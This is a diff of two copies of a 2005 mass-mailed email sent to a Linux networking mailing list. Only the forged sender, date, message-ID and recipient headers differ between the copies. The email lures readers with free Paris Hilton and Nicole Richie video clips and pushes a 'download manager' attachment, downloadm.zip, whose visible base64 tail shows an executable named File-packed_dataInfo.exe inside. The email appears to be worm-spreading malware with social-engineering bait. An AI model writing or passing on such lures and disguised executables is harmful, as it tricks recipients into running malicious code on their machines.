@@ -1,19 +1,19 @@
-From: office@metaparadigm.com
+From: webmaster@auckland.ac.nz
 Subject: Paris Hilton & Nicole Richie
-Date: Wed, 21 Dec 2005 16:36:15 UTC
-Message-ID: <5cad.3e7cab42b7d6c@oss.sgi.com>
+Date: Wed, 21 Dec 2005 18:24:38 GMT
+Message-ID: <cbaa.8572145a2c6e@auckland.ac.nz>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===ffb1f2a76fff.dba88d2ee1ed"
+Content-Type: multipart/mixed; boundary="==d1e1bd.f4fd684e9390b5dd"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: XFreeMail@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===ffb1f2a76fff.dba88d2ee1ed
+--==d1e1bd.f4fd684e9390b5dd
 
 The Simple Life:
 
@@ -21,7 +21,7 @@ View Paris Hilton & Nicole Richie video clips , pictures & more ;)
 Download is free until Jan, 2006!
 
 Please use our Download manager.
---===ffb1f2a76fff.dba88d2ee1ed
+--==d1e1bd.f4fd684e9390b5dd
 Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="downloadm.zip"
@@ -1001,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===ffb1f2a76fff.dba88d2ee1ed--
+--==d1e1bd.f4fd684e9390b5dd--
